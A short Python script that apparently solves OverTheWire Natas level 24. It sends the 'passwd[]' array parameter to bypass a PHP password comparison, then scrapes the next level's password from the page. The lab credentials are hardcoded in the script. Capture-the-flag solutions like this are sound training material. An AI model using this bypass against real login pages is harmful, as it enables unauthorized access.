import re, requests
USER = 'natas24'
PASS = 'MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd'
URL = f'http://{USER}.natas.labs.overthewire.org/'
AUTH_BASIC = requests.auth.HTTPBasicAuth(USER, PASS)
payload = '?passwd[]=opaiebom'

request = requests.get(url=URL + payload, auth=AUTH_BASIC)
response_http = request.text
flag = re.findall(r'(Password:[^:]+/pre)', response_http)
print('The password for the natas25 is:',flag[0][10: -5])